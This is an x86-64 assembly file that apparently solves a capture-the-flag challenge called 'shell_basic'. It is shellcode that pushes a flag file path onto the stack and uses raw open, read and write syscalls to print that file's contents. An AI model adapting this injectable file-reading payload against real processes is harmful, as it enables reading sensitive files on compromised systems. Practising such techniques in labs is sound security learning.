; File Name: orw.asm
; pushing "/home/shell_basic/flag_name_is_loooooong" into stack
section .text
global _start
_start:
push 0x00
mov rax, 0x676E6F6F6F6F6F6F ; oooooong
push rax
mov rax, 0x6C5F73695F656D61 ; ame_is_l
push rax
mov rax, 0x6E5F67616C662F63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax
; invoking open(path, fd, null) fd is 0 in this case (RD_ONLY)
; rdi, rsi, rdx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x02
syscall
; invoking read(fd, buf, size) fd is returned value from open()
mov rdi, rax
mov rsi, rsp	;sibal i gu moo ya...
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x00
syscall
; invoking write(1, buf, size)
mov rdi, 0x01
mov rax, 0x01
syscall
; exiting the system
xor rdi, rdi
mov rax, 0x3C
syscall
